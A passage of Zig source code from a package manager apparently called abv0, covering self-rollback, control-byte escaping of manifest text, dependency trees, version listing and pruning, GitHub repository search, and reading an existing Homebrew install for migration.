        term.err("{s}error{s}: no earlier abv0 is kept; `self-update` keeps the one it replaces from now on\n", .{ term.red, term.reset });
        return 1;
    };
    const exe_path = std.fs.selfExePathAlloc(aa) catch |e| {
        term.err("{s}error{s}: cannot locate the running binary ({s})\n", .{ term.red, term.reset, @errorName(e) });
        return 1;
    };
    const exe_dir = std.fs.path.dirname(exe_path) orelse return 1;
    var rand_buf: [8]u8 = undefined;
    std.crypto.random.bytes(&rand_buf);
    const tmp_path = try std.fs.path.join(aa, &.{ exe_dir, try std.fmt.allocPrint(aa, "abv0-rollback-{s}.tmp", .{std.fmt.bytesToHex(rand_buf, .lower)}) });
    // Next to the running binary, so the swap is one rename on one filesystem.
    std.fs.cwd().copyFile(saved, std.fs.cwd(), tmp_path, .{}) catch |e| {
        term.err("{s}error{s}: cannot copy the kept abv0 ({s})\n", .{ term.red, term.reset, @errorName(e) });
        return 1;
    };
    platform.chmodPath(tmp_path, platform.mode_bin);
    const sanity = std.process.Child.run(.{ .allocator = aa, .argv = &.{ tmp_path, "--version" }, .max_output_bytes = 64 * 1024 }) catch null;
    const old_version = if (sanity) |r| (if (r.term == .Exited and r.term.Exited == 0) versionFromOutput(r.stdout) else null) else null;
    if (old_version == null) {
        std.fs.cwd().deleteFile(tmp_path) catch {};
        term.err("{s}error{s}: the kept abv0 does not run; nothing was changed\n", .{ term.red, term.reset });
        return 1;
    }
    // The current one becomes the kept one, so a second rollback goes forward.
    const swap_back = try std.fmt.allocPrint(aa, "{s}.{s}.tmp", .{ saved, std.fmt.bytesToHex(rand_buf, .lower) });
    std.fs.cwd().copyFile(exe_path, std.fs.cwd(), swap_back, .{}) catch {};
    if (!swapExe(aa, exe_path, tmp_path)) {
        std.fs.cwd().deleteFile(swap_back) catch {};
        return 1;
    }
    std.fs.cwd().rename(swap_back, saved) catch {};
    term.print("{s}rolled back{s} abv0 {s} -> {s}\n", .{ term.green, term.reset, current_version, old_version.? });
    term.print("  `abv0 self-update` goes forward again ({s} is kept)\n", .{current_version});
    return 0;
}

// ---------------------------------------------------------------------------
// Terminal-safe text and JSON strings (shared with main.zig)
// ---------------------------------------------------------------------------

/// Terminal-safe view of manifest text. Manifest strings come from a remote
/// index and may carry escape sequences that move the cursor, rewrite earlier
/// lines or retitle the window. Every control byte (0x00-0x1f, which includes
/// ESC and tab/newline, and 0x7f) prints as '?'. Use with `{}`. Pads on the
/// right when a width is given, like `{s:<16}`.
pub const Safe = struct {
    text: []const u8,

    pub fn format(
        self: Safe,
        comptime fmt_str: []const u8,
        options: std.fmt.FormatOptions,
        writer: anytype,
    ) !void {
        _ = fmt_str;
        for (self.text) |c| try writer.writeByte(if (c < 0x20 or c == 0x7f) '?' else c);
        if (options.width) |w| {
            if (w > self.text.len) try writer.writeByteNTimes(' ', w - self.text.len);
        }
    }
};

pub fn safe(text: []const u8) Safe {
    return .{ .text = text };
}

/// Every JSON string value goes through the standard encoder, so quotes,
/// backslashes and control bytes can never break out of the document.
pub fn writeJsonString(w: anytype, s: []const u8) !void {
    try std.json.encodeJsonString(s, .{}, w);
}

// ---------------------------------------------------------------------------
// Dependency graph: deps, uses, leaves
// ---------------------------------------------------------------------------

/// One package in the store: its newest installed version for a platform.
pub const InstalledPkg = struct {
    name: []const u8,
    version: []const u8,
};

fn lessInstalledByName(_: void, x: InstalledPkg, y: InstalledPkg) bool {
    return std.mem.order(u8, x.name, y.name) == .lt;
}

/// Every package with a store directory for `platform_name`, newest version
/// each, sorted by name. Read from the directory names, so packages the
/// registry no longer lists (and GitHub installs) are included.
pub fn installedPackages(a: std.mem.Allocator, st: *const store.Store, platform_name: []const u8) ![]InstalledPkg {
    var rows = std.ArrayList(InstalledPkg).init(a);
    errdefer rows.deinit();

    var dir = std.fs.cwd().openDir(st.store_root, .{ .iterate = true }) catch return rows.toOwnedSlice();
    defer dir.close();
    var it = dir.iterate();
    while (try it.next()) |entry| {
        if (entry.kind != .directory) continue;
        const parsed = store.Store.parseStoreDirName(entry.name) orelse continue;
        if (!std.mem.eql(u8, parsed.platform, platform_name)) continue;
        var found = false;
        for (rows.items) |*r| {
            if (!std.mem.eql(u8, r.name, parsed.name)) continue;
            found = true;
            if (registry.compareVersions(parsed.version, r.version) == .gt) r.version = try a.dupe(u8, parsed.version);
        }
        if (!found) try rows.append(.{ .name = try a.dupe(u8, parsed.name), .version = try a.dupe(u8, parsed.version) });
    }
    std.mem.sort(InstalledPkg, rows.items, {}, lessInstalledByName);
    return rows.toOwnedSlice();
}

fn walkDeps(
    reg: *const registry.Registry,
    name: []const u8,
    depth: usize,
    out: *std.ArrayList([]const u8),
    seen: *std.StringHashMap(void),
) !void {
    if (depth >= registry.max_dependency_depth) return error.DependencyTooDeep;
    const pkg = reg.get(name) orelse return;
    for (pkg.deps) |d| {
        if (seen.contains(d)) continue;
        try seen.put(d, {});
        try walkDeps(reg, d, depth + 1, out, seen);
        try out.append(d);
    }
}

/// Every transitive dependency of `root`, each once, dependencies before the
/// packages that need them (the order `install` uses). `root` itself is not
/// listed. A dependency the registry does not know is listed but not followed.
pub fn collectDeps(a: std.mem.Allocator, reg: *const registry.Registry, root: []const u8) ![]const []const u8 {
    var out = std.ArrayList([]const u8).init(a);
    errdefer out.deinit();
    var seen = std.StringHashMap(void).init(a);
    defer seen.deinit();
    try seen.put(root, {});
    try walkDeps(reg, root, 0, &out, &seen);
    return out.toOwnedSlice();
}

const tree_branch = "\xe2\x94\x9c\xe2\x94\x80\xe2\x94\x80 ";
const tree_last = "\xe2\x94\x94\xe2\x94\x80\xe2\x94\x80 ";
const tree_bar = "\xe2\x94\x82   ";
const tree_blank = "    ";

fn writeTreeChildren(
    w: anytype,
    reg: *const registry.Registry,
    deps: []const []const u8,
    prefix: *std.ArrayList(u8),
    expanded: *std.StringHashMap(void),
    on_path: *std.StringHashMap(void),
    depth: usize,
) anyerror!void {
    for (deps, 0..) |dep, i| {
        const last = i + 1 == deps.len;
        try w.print("{s}{s}{s}", .{ prefix.items, if (last) tree_last else tree_branch, dep });
        const pkg = reg.get(dep) orelse {
            try w.writeAll(" (not in the catalog)\n");
            continue;
        };
        if (on_path.contains(dep)) {
            try w.writeAll(" (cycle)\n");
            continue;
        }
        if (pkg.deps.len == 0) {
            try w.writeAll("\n");
            continue;
        }
        if (expanded.contains(dep)) {
            try w.writeAll(" (*)\n");
            continue;
        }
        if (depth + 1 >= registry.max_dependency_depth) {
            try w.writeAll(" (too deep)\n");
            continue;
        }
        try w.writeAll("\n");
        try expanded.put(dep, {});
        try on_path.put(dep, {});
        const mark = prefix.items.len;
        try prefix.appendSlice(if (last) tree_blank else tree_bar);
        try writeTreeChildren(w, reg, pkg.deps, prefix, expanded, on_path, depth + 1);
        prefix.shrinkRetainingCapacity(mark);
        _ = on_path.remove(dep);
    }
}

/// `deps --tree`: the package, then its dependencies indented under it. A
/// package already shown higher in the tree is marked `(*)` and not expanded
/// again; a cycle is marked `(cycle)`.
pub fn writeDepsTree(w: anytype, a: std.mem.Allocator, reg: *const registry.Registry, root: registry.Package) !void {
    try w.print("{s}\n", .{root.name});
    var prefix = std.ArrayList(u8).init(a);
    defer prefix.deinit();
    var expanded = std.StringHashMap(void).init(a);
    defer expanded.deinit();
    var on_path = std.StringHashMap(void).init(a);
    defer on_path.deinit();
    try expanded.put(root.name, {});
    try on_path.put(root.name, {});
    try writeTreeChildren(w, reg, root.deps, &prefix, &expanded, &on_path, 0);
}

fn writeTreeJson(
    w: anytype,
    reg: *const registry.Registry,
    name: []const u8,
    on_path: *std.StringHashMap(void),
    depth: usize,
) anyerror!void {
    try w.writeAll("{\"name\":");
    try writeJsonString(w, name);
    const pkg = reg.get(name) orelse {
        try w.writeAll(",\"in_catalog\":false}");
        return;
    };
    try w.writeAll(",\"version\":");
    try writeJsonString(w, pkg.version);
    if (on_path.contains(name)) {
        try w.writeAll(",\"cycle\":true}");
        return;
    }
    try w.writeAll(",\"deps\":[");
    if (depth + 1 < registry.max_dependency_depth) {
        try on_path.put(name, {});
        for (pkg.deps, 0..) |d, i| {
            if (i > 0) try w.writeAll(",");
            try writeTreeJson(w, reg, d, on_path, depth + 1);
        }
        _ = on_path.remove(name);
    }
    try w.writeAll("]}");
}

/// `deps --tree --json`: nested `{name, version, deps: [...]}` objects.
pub fn writeDepsTreeJson(w: anytype, a: std.mem.Allocator, reg: *const registry.Registry, root: registry.Package) !void {
    var on_path = std.StringHashMap(void).init(a);
    defer on_path.deinit();
    try writeTreeJson(w, reg, root.name, &on_path, 0);
    try w.writeAll("\n");
}

/// `deps --json`: `{"package": ..., "dependencies": [...]}`, install order.
pub fn writeDepsFlatJson(w: anytype, name: []const u8, deps: []const []const u8) !void {
    try w.writeAll("{\"package\":");
    try writeJsonString(w, name);
    try w.writeAll(",\"dependencies\":[");
    for (deps, 0..) |d, i| {
        if (i > 0) try w.writeAll(",");
        try writeJsonString(w, d);
    }
    try w.writeAll("]}\n");
}

/// Installed packages whose registry entry lists `target` as a dependency.
pub fn dependentsOf(
    a: std.mem.Allocator,
    reg: *const registry.Registry,
    installed: []const InstalledPkg,
    target: []const u8,
) ![]InstalledPkg {
    var out = std.ArrayList(InstalledPkg).init(a);
    errdefer out.deinit();
    for (installed) |p| {
        if (std.mem.eql(u8, p.name, target)) continue;
        const pkg = reg.get(p.name) orelse continue;
        if (containsName(pkg.deps, target)) try out.append(p);
    }
    return out.toOwnedSlice();
}

/// Installed packages that no other installed package depends on.
pub fn leavesOf(a: std.mem.Allocator, reg: *const registry.Registry, installed: []const InstalledPkg) ![]InstalledPkg {
    var out = std.ArrayList(InstalledPkg).init(a);
    errdefer out.deinit();
    for (installed) |p| {
        var needed = false;
        for (installed) |q| {
            if (std.mem.eql(u8, p.name, q.name)) continue;
            const pkg = reg.get(q.name) orelse continue;
            if (containsName(pkg.deps, p.name)) {
                needed = true;
                break;
            }
        }
        if (!needed) try out.append(p);
    }
    return out.toOwnedSlice();
}

// ---------------------------------------------------------------------------
// Installed versions: switch, rollback, upgrade's kept previous version
// ---------------------------------------------------------------------------

/// One installed version of a package, oldest first in `listVersions`.
pub const VersionRow = struct {
    version: []const u8,
    dir_name: []const u8,
    /// The bin links point into this version's store directory.
    active: bool = false,
    /// Size on disk; only filled by `gatherInfo`.
    bytes: u64 = 0,
};

/// One file in the bin directory, links followed.
const FileId = struct {
    inode: @TypeOf(@as(std.fs.File.Stat, undefined).inode),
    size: u64,
    path: []const u8,
    /// SHA-256 of the file, filled in only when a content comparison needs it.
    hash: ?[64]u8 = null,
};

/// Identity (inode and size) of every file in the bin directory, links
/// followed. A hard-linked bin is the same file as its store copy, which is how
/// the active version is told apart when there is no symlink to read.
fn binFileIds(a: std.mem.Allocator, st: *const store.Store) ![]FileId {
    var out = std.ArrayList(FileId).init(a);
    errdefer out.deinit();
    var dir = std.fs.cwd().openDir(st.bin_root, .{ .iterate = true }) catch return out.toOwnedSlice();
    defer dir.close();
    var it = dir.iterate();
    while (try it.next()) |entry| {
        const info = dir.statFile(entry.name) catch continue;
        if (info.kind != .file) continue;
        try out.append(.{
            .inode = info.inode,
            .size = info.size,
            .path = try std.fs.path.join(a, &.{ st.bin_root, entry.name }),
        });
    }
    return out.toOwnedSlice();
}

/// True when a file under `dir_path` is one of `ids`: the same inode (a hard
/// link), or with `by_content`, the same bytes (a copy or an APFS clone, which
/// have inodes of their own). Content is only hashed for files of equal size.
fn treeHoldsBin(a: std.mem.Allocator, dir_path: []const u8, ids: []FileId, by_content: bool) bool {
    if (ids.len == 0) return false;
    var dir = std.fs.cwd().openDir(dir_path, .{ .iterate = true }) catch return false;
    defer dir.close();
    var walker = dir.walk(a) catch return false;
    defer walker.deinit();
    while (walker.next() catch null) |entry| {
        if (entry.kind != .file) continue;
        const info = entry.dir.statFile(entry.basename) catch continue;
        var file_hash: ?[64]u8 = null;
        for (ids) |*id| {
            if (id.size != info.size) continue;
            if (!by_content) {
                if (id.inode == info.inode) return true;
                continue;
            }
            if (id.hash == null) id.hash = sha256File(id.path) catch continue;
            if (file_hash == null) {
                const full = std.fs.path.join(a, &.{ dir_path, entry.path }) catch continue;
                file_hash = sha256File(full) catch continue;
            }
            if (std.mem.eql(u8, &file_hash.?, &id.hash.?)) return true;
        }
    }
    return false;
}

fn lessVersionRow(_: void, x: VersionRow, y: VersionRow) bool {
    return registry.compareVersions(x.version, y.version) == .lt;
}

/// The versions of `name` in the store for `platform_name`, oldest first, with
/// the one the bin links currently use marked `active`.
pub fn listVersions(a: std.mem.Allocator, st: *const store.Store, name: []const u8, platform_name: []const u8) ![]VersionRow {
    const found = try st.installedVersions(a, name, platform_name);
    defer a.free(found);
    const rows = try a.alloc(VersionRow, found.len);
    errdefer a.free(rows);
    for (found, rows) |f, *r| r.* = .{ .version = f.version, .dir_name = f.dir_name };
    std.mem.sort(VersionRow, rows, {}, lessVersionRow);
    if (rows.len == 0) return rows;

    const targets = try linkTargets(a, st);
    const ids = try binFileIds(a, st);
    var any = false;
    for (rows) |*r| {
        const path = try std.fs.path.join(a, &.{ st.store_root, r.dir_name });
        r.active = isLinkedInto(path, targets) or treeHoldsBin(a, path, ids, false);
        any = any or r.active;
    }
    if (any) return rows;
    // No symlink and no hard link points here: the bins may be copies or
    // clones, so look for the same bytes.
    for (rows) |*r| {
        const path = try std.fs.path.join(a, &.{ st.store_root, r.dir_name });
        r.active = treeHoldsBin(a, path, ids, true);
    }
    return rows;
}

/// Index of the active version (the newest one marked, if several are).
pub fn activeIndex(rows: []const VersionRow) ?usize {
    var i = rows.len;
    while (i > 0) {
        i -= 1;
        if (rows[i].active) return i;
    }
    return null;
}

fn normVersion(v: []const u8) []const u8 {
    if (v.len >= 2 and (v[0] == 'v' or v[0] == 'V') and std.ascii.isDigit(v[1])) return v[1..];
    return v;
}

/// The row for a version typed on the command line. A leading `v` is ignored
/// on either side, so `v1.2.0` finds the store's `1.2.0`.
pub fn findVersion(rows: []const VersionRow, wanted: []const u8) ?usize {
    const w = normVersion(wanted);
    for (rows, 0..) |r, i| {
        if (std.mem.eql(u8, r.version, wanted) or std.mem.eql(u8, normVersion(r.version), w)) return i;
    }
    return null;
}

/// The version `rollback` goes to: the one just below the active version (or
/// below the newest, when no link could be matched to a version).
pub fn previousIndex(rows: []const VersionRow) ?usize {
    if (rows.len == 0) return null;
    const cur = activeIndex(rows) orelse rows.len - 1;
    return if (cur == 0) null else cur - 1;
}

/// After an upgrade to `new_version`, which of `versions` to delete: all but
/// the new version and the newest one older than it, which `rollback` needs.
/// Returns indices into `versions`.
pub fn planPrune(a: std.mem.Allocator, versions: []const []const u8, new_version: []const u8) ![]usize {
    var prev: ?usize = null;
    for (versions, 0..) |v, i| {
        if (std.mem.eql(u8, v, new_version)) continue;
        if (registry.compareVersions(v, new_version) != .lt) continue;
        if (prev == null or registry.compareVersions(v, versions[prev.?]) == .gt) prev = i;
    }
    var out = std.ArrayList(usize).init(a);
    errdefer out.deinit();
    for (versions, 0..) |v, i| {
        if (std.mem.eql(u8, v, new_version)) continue;
        if (prev != null and prev.? == i) continue;
        try out.append(i);
    }
    return out.toOwnedSlice();
}

/// `upgrade`'s pruning: keep `new_version` and the version right before it
/// (for `rollback`), delete the rest. Returns how many directories went.
pub fn pruneKeepingPrevious(
    a: std.mem.Allocator,
    st: *const store.Store,
    name: []const u8,
    new_version: []const u8,
    platform_name: []const u8,
) !usize {
    if (!safepath.isValidId(name)) return store.StoreError.InvalidPackageIdentifier;
    var arena = std.heap.ArenaAllocator.init(a);
    defer arena.deinit();
    const aa = arena.allocator();

    const found = try st.installedVersions(aa, name, platform_name);
    const versions = try aa.alloc([]const u8, found.len);
    for (found, versions) |f, *v| v.* = f.version;
    const victims = try planPrune(aa, versions, new_version);

    var removed: usize = 0;
    for (victims) |i| {
        const p = try std.fs.path.join(aa, &.{ st.store_root, found[i].dir_name });
        if (std.fs.cwd().deleteTree(p)) |_| {
            removed += 1;
        } else |_| {}
    }
    return removed;
}

/// What `info` shows about a package that is in the store.
pub const InfoData = struct {
    rows: []VersionRow,
    bins: []const []const u8,
    total_bytes: u64,
};

pub fn gatherInfo(a: std.mem.Allocator, st: *const store.Store, name: []const u8, platform_name: []const u8) !InfoData {
    const rows = try listVersions(a, st, name, platform_name);
    var total: u64 = 0;
    for (rows) |*r| {
        const path = try std.fs.path.join(a, &.{ st.store_root, r.dir_name });
        r.bytes = treeSize(a, path);
        total += r.bytes;
    }
    const bins = if (rows.len == 0) &[_][]const u8{} else try st.ownedBins(a, name);
    return .{ .rows = rows, .bins = bins, .total_bytes = total };
}

// ---------------------------------------------------------------------------
// search --online: GitHub repository search
// ---------------------------------------------------------------------------

/// One repository from the GitHub search API.
pub const Repo = struct {
    /// `owner/repo`, already checked to be a valid `gh:` spec.
    full_name: []const u8,
    stars: u64,
    description: []const u8,
};

pub const SearchError = error{ GitHubApiMessage, BadResponse };

/// Longest query sent to GitHub.
pub const max_query_len = 256;

pub fn searchUrl(a: std.mem.Allocator, query: []const u8) ![]u8 {
    const enc = try net.urlEncode(a, query);
    defer a.free(enc);
    return std.fmt.allocPrint(
        a,
        "https://api.github.com/search/repositories?q={s}+in:name&sort=stars&per_page=10",
        .{enc},
    );
}

/// Parse a search response. Entries whose `full_name` is not a plain
/// `owner/repo` are dropped, so every result can be put on an install line.
/// When GitHub answers with `{"message": ...}` instead, `message` receives it
/// and the error is `GitHubApiMessage`.
pub fn parseSearchResults(a: std.mem.Allocator, body: []const u8, message: *?[]const u8) SearchError![]Repo {
    const root = std.json.parseFromSliceLeaky(std.json.Value, a, body, .{}) catch return error.BadResponse;
    const obj = switch (root) {
        .object => |o| o,
        else => return error.BadResponse,
    };
    const items_value = obj.get("items") orelse {
        if (obj.get("message")) |m| {
            if (m == .string) {
                message.* = m.string;
                return error.GitHubApiMessage;
            }
        }
        return error.BadResponse;
    };
    const items = switch (items_value) {
        .array => |arr| arr.items,
        else => return error.BadResponse,
    };

    var out = std.ArrayList(Repo).init(a);
    for (items) |item| {
        if (item != .object) continue;
        const full = item.object.get("full_name") orelse continue;
        if (full != .string) continue;
        const spec = ghrelease.parseSpec(full.string) orelse continue;
        if (spec.tag != null) continue;
        const stars: u64 = if (item.object.get("stargazers_count")) |s| switch (s) {
            .integer => |n| if (n < 0) 0 else @intCast(n),
            else => 0,
        } else 0;
        const desc: []const u8 = if (item.object.get("description")) |d| switch (d) {
            .string => |s| s,
            else => "",
        } else "";
        out.append(.{ .full_name = full.string, .stars = stars, .description = desc }) catch return error.BadResponse;
    }
    return out.toOwnedSlice() catch error.BadResponse;
}

/// `GITHUB_TOKEN`, else `GH_TOKEN`, when it is made only of plain token
/// characters, so the value can never add a header line.
fn githubToken(a: std.mem.Allocator) ?[]const u8 {
    for ([_][]const u8{ "GITHUB_TOKEN", "GH_TOKEN" }) |key| {
        const v = platform.envOwned(a, key) orelse continue;
        const t = std.mem.trim(u8, v, " \t\r\n");
        if (t.len == 0 or t.len > 512) continue;
        for (t) |c| {
            if (!std.ascii.isAlphanumeric(c) and c != '_' and c != '-' and c != '.') break;
        } else return t;
    }
    return null;
}

/// Ask GitHub for repositories whose name matches `query`, most stars first.
/// Debug builds (which includes `zig build test`) read the response from the
/// file named by `ABV0_GH_SEARCH_FIXTURE` instead of calling the API.
pub fn searchGithub(a: std.mem.Allocator, query: []const u8, message: *?[]const u8) ![]Repo {
    if (comptime builtin.mode == .Debug) {
        if (platform.envOwned(a, "ABV0_GH_SEARCH_FIXTURE")) |path| {
            const body = try std.fs.cwd().readFileAlloc(a, path, 2 * 1024 * 1024);
            return parseSearchResults(a, body, message);
        }
    }
    const url = try searchUrl(a, query);
    var headers = std.ArrayList([]const u8).init(a);
    try headers.append("Accept: application/vnd.github+json");
    if (githubToken(a)) |tok| {
        try headers.append(try std.fmt.allocPrint(a, "Authorization: Bearer {s}", .{tok}));
    }
    const body = try net.fetchToString(a, url, 2 * 1024 * 1024, .{ .headers = headers.items });
    return parseSearchResults(a, body, message);
}

// ---------------------------------------------------------------------------
// migrate: read package names from a Homebrew list or Brewfile
// ---------------------------------------------------------------------------

pub const NameSource = enum {
    /// `brew list --formula` saved to a file: one name per line.
    list,
    /// A Brewfile: names come from its `brew "name"` lines.
    brewfile,
};

/// A usable formula name from one token: a tap prefix (`homebrew/core/jq`) is
/// dropped, and anything that is not a plain printable word is refused.
fn cleanName(token: []const u8) ?[]const u8 {
    const slash = std.mem.lastIndexOfScalar(u8, token, '/');
    const name = if (slash) |i| token[i + 1 ..] else token;
    if (name.len == 0 or name.len > 128) return null;
    for (name) |c| {
        if (c <= 0x20 or c >= 0x7f) return null;
    }
    return name;
}

fn looksLikeVersion(token: []const u8) bool {
    if (token.len == 0 or !std.ascii.isDigit(token[0])) return false;
    for (token) |c| {
        if (!std.ascii.isAlphanumeric(c) and c != '.' and c != '_' and c != '-' and c != '+') return false;
    }
    return true;
}

/// The names in `text`, each once, in order of appearance. Reads names only:
/// versions, options and every other Brewfile entry kind (tap, cask, mas, vscode)
/// are ignored. Slices point into `text`.
pub fn parseNames(a: std.mem.Allocator, text: []const u8, source: NameSource) ![]const []const u8 {
    var out = std.ArrayList([]const u8).init(a);
    errdefer out.deinit();
    var seen = std.StringHashMap(void).init(a);
    defer seen.deinit();

    var lines = std.mem.splitScalar(u8, text, '\n');
    while (lines.next()) |raw| {
        const line = std.mem.trim(u8, raw, " \t\r");
        if (line.len == 0 or line[0] == '#') continue;

        switch (source) {
            .brewfile => {
                if (!std.mem.startsWith(u8, line, "brew")) continue;
                var rest = line["brew".len..];
                if (rest.len == 0 or (rest[0] != ' ' and rest[0] != '\t' and rest[0] != '(')) continue;
                rest = std.mem.trimLeft(u8, rest, " \t(");
                if (rest.len < 2 or (rest[0] != '"' and rest[0] != '\'')) continue;
                const end = std.mem.indexOfScalarPos(u8, rest, 1, rest[0]) orelse continue;
                const name = cleanName(rest[1..end]) orelse continue;
                if (try seen.fetchPut(name, {}) == null) try out.append(name);
            },
            .list => {
                // `brew list --versions` puts versions after each name; take
                // the name alone. Otherwise every word is a name.
                var tokens = std.mem.tokenizeAny(u8, line, " \t");
                const first = tokens.next() orelse continue;
                var all_versions = true;
                var probe = tokens;
                while (probe.next()) |t| {
                    if (!looksLikeVersion(t)) all_versions = false;
                }
                if (all_versions) {
                    if (cleanName(first)) |name| {
                        if (try seen.fetchPut(name, {}) == null) try out.append(name);
                    }
                    continue;
                }
                tokens.reset();
                while (tokens.next()) |t| {
                    const name = cleanName(t) orelse continue;
                    if (try seen.fetchPut(name, {}) == null) try out.append(name);
                }
            },
        }
    }
    return out.toOwnedSlice();
}

/// How a name from a Homebrew list was found in the abv0 catalog.
pub const Via = enum {
    /// A catalog package with exactly that name.
    exact,
    /// A catalog package that ships an executable with that name.
    bin,
    /// After dropping an `@version` suffix (`python@3.12` -> `python`), by name.
    unversioned,
    /// After dropping an `@version` suffix, by executable name.
    unversioned_bin,

    pub fn label(self: Via) []const u8 {
        return switch (self) {
            .exact => "name",
            .bin => "bin",
            .unversioned => "name, version suffix dropped",
            .unversioned_bin => "bin, version suffix dropped",
        };
    }
};

pub const Match = struct {
    wanted: []const u8,
    pkg: registry.Package,
    via: Via,
};

/// Find `wanted` in the catalog: exact name first, then an executable of that
/// name, then the same two again without an `@version` suffix.
pub fn matchName(reg: *const registry.Registry, wanted: []const u8) ?Match {
    if (reg.get(wanted)) |p| return .{ .wanted = wanted, .pkg = p, .via = .exact };
    if (reg.findByBin(wanted)) |p| return .{ .wanted = wanted, .pkg = p, .via = .bin };
    if (std.mem.indexOfScalar(u8, wanted, '@')) |at| {
        const base = wanted[0..at];
        if (base.len == 0) return null;
        if (reg.get(base)) |p| return .{ .wanted = wanted, .pkg = p, .via = .unversioned };
        if (reg.findByBin(base)) |p| return .{ .wanted = wanted, .pkg = p, .via = .unversioned_bin };
    }
    return null;
}

// ---------------------------------------------------------------------------
// migrate: read a Homebrew install straight from disk
// ---------------------------------------------------------------------------

pub const BrewKind = enum { formula, cask };

pub const BrewItem = struct {
    name: []const u8,
    kind: BrewKind,
    /// Installed by hand, not pulled in as a dependency.
    requested: bool,
    /// `brew pin` was used on it.
    pinned: bool,
};

/// Where Homebrew may live, most likely first. With `HOMEBREW_PREFIX` set,
/// only that one.
pub fn brewPrefixes(a: std.mem.Allocator, env_prefix: ?[]const u8, home: ?[]const u8) ![]const []const u8 {
    var out = std.ArrayList([]const u8).init(a);
    if (env_prefix) |p| {
        if (p.len != 0) {
            try out.append(p);
            return out.toOwnedSlice();
        }
    }
    try out.appendSlice(&.{ "/opt/homebrew", "/usr/local", "/home/linuxbrew/.linuxbrew" });
    if (home) |h| try out.append(try std.fs.path.join(a, &.{ h, ".linuxbrew" }));
    return out.toOwnedSlice();
}

/// What an install receipt says about `installed_on_request`, or null when it
/// does not say. Only that one key is looked at, so the file is not parsed.
pub fn receiptRequested(text: []const u8) ?bool {
    const key = "\"installed_on_request\"";
    const at = std.mem.indexOf(u8, text, key) orelse return null;
    var rest = std.mem.trimLeft(u8, text[at + key.len ..], " \t\r\n");
    if (rest.len == 0 or rest[0] != ':') return null;
    rest = std.mem.trimLeft(u8, rest[1..], " \t\r\n");
    if (std.mem.startsWith(u8, rest, "true")) return true;
    if (std.mem.startsWith(u8, rest, "false")) return false;
    return null;
}

/// True when one of the version folders of `formula` has a receipt saying
/// it was installed by hand. A formula without a readable receipt counts as
/// installed by hand, so nothing is left behind by mistake.
fn formulaRequested(cellar: std.fs.Dir, formula: []const u8, buf: []u8) bool {
    var dir = cellar.openDir(formula, .{ .iterate = true }) catch return true;
    defer dir.close();
    var it = dir.iterate();
    var any = false;
    while (it.next() catch null) |entry| {
        if (entry.name.len == 0 or entry.name[0] == '.') continue;
        var vdir = dir.openDir(entry.name, .{}) catch continue;
        defer vdir.close();
        const f = vdir.openFile("INSTALL_RECEIPT.json", .{}) catch continue;
        defer f.close();
        const n = f.readAll(buf) catch continue;
        any = true;
        if (receiptRequested(buf[0..n]) orelse true) return true;
    }
    return !any;
}

fn lessName(_: void, x: BrewItem, y: BrewItem) bool {
    return std.mem.order(u8, x.name, y.name) == .lt;
}

/// The formulae and casks of the Homebrew at `prefix`, sorted by name, or
/// null when there is no Homebrew there. Only folders and small receipt files
/// are read; brew itself is never run.
pub fn scanBrew(a: std.mem.Allocator, prefix: []const u8) !?[]BrewItem {
    var root = std.fs.cwd().openDir(prefix, .{}) catch return null;
    defer root.close();

    var out = std.ArrayList(BrewItem).init(a);
    errdefer out.deinit();
    var found = false;

    var pinned_dir: ?std.fs.Dir = root.openDir("var/homebrew/pinned", .{}) catch null;
    defer if (pinned_dir) |*d| d.close();

    // Receipts are a few kilobytes; the key is near the top.
    var buf: [64 * 1024]u8 = undefined;
    if (root.openDir("Cellar", .{ .iterate = true })) |cellar_const| {
        var cellar = cellar_const;
        defer cellar.close();
        found = true;
        var it = cellar.iterate();
        while (try it.next()) |entry| {
            if (entry.kind != .directory and entry.kind != .sym_link) continue;
            if (entry.name.len == 0 or entry.name[0] == '.') continue;
            const name = cleanName(entry.name) orelse continue;
            const pinned = if (pinned_dir) |d| blk: {
                d.access(name, .{}) catch break :blk false;
                break :blk true;
            } else false;
            try out.append(.{
                .name = try a.dupe(u8, name),
                .kind = .formula,
                .requested = formulaRequested(cellar, name, &buf),
                .pinned = pinned,
            });
        }
    } else |_| {}

    if (root.openDir("Caskroom", .{ .iterate = true })) |casks_const| {
        var casks = casks_const;
        defer casks.close();
        found = true;
        var it = casks.iterate();
        while (try it.next()) |entry| {
            if (entry.kind != .directory) continue;
            if (entry.name.len == 0 or entry.name[0] == '.') continue;
            const name = cleanName(entry.name) orelse continue;
            try out.append(.{ .name = try a.dupe(u8, name), .kind = .cask, .requested = true, .pinned = false });
        }
    } else |_| {}

    if (!found) {
        out.deinit();
        return null;
    }
    const items = try out.toOwnedSlice();
    std.mem.sort(BrewItem, items, {}, lessName);
    return items;
}

/// A word a POSIX shell takes as it is: letters, digits and `@._+-`.
pub fn isShellWord(s: []const u8) bool {
    if (s.len == 0) return false;
    for (s) |c| {
        if (!std.ascii.isAlphanumeric(c) and c != '@' and c != '.' and c != '_' and c != '+' and c != '-') return false;
    }
    return true;
}

/// Find a cask in the catalog. Casks are apps: only a package with the same
/// name counts, never one that merely ships a program of that name.
pub fn matchCask(reg: *const registry.Registry, wanted: []const u8) ?Match {
    if (reg.get(wanted)) |p| return .{ .wanted = wanted, .pkg = p, .via = .exact };
    return null;
}

/// Pin each of `names` that is not pinned yet; returns how many were added.
pub fn addPins(a: std.mem.Allocator, st: *const store.Store, names: []const []const u8) !usize {
    var arena = std.heap.ArenaAllocator.init(a);
    defer arena.deinit();
    const aa = arena.allocator();
    const current = try readPins(aa, st);
    var next = std.ArrayList([]const u8).init(aa);
    try next.appendSlice(current);
    var added: usize = 0;
    for (names) |n| {
        if (!safepath.isValidId(n) or containsName(next.items, n)) continue;
        try next.append(n);
        added += 1;
    }
    if (added > 0) try writePins(aa, st, next.items);
    return added;
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

fn testStore(a: std.mem.Allocator, root: []u8) !store.Store {
    return .{
        .allocator = a,
        .home = root,
        .root = root,
        .store_root = try std.fs.path.join(a, &.{ root, "store" }),
        .bin_root = try std.fs.path.join(a, &.{ root, "bin" }),
        .shells_root = try std.fs.path.join(a, &.{ root, "shells" }),
        .apps_root = try std.fs.path.join(a, &.{ root, "apps" }),
        .registry_root = try std.fs.path.join(a, &.{ root, "registry" }),
        .locks_root = try std.fs.path.join(a, &.{ root, "locks" }),
    };
}

test "every command and helper compiles for this target" {
    // `check` only analyses what main.zig references, so reference everything here.
    std.testing.refAllDeclsRecursive(@This());
}

test "pins add, remove and list round trip" {
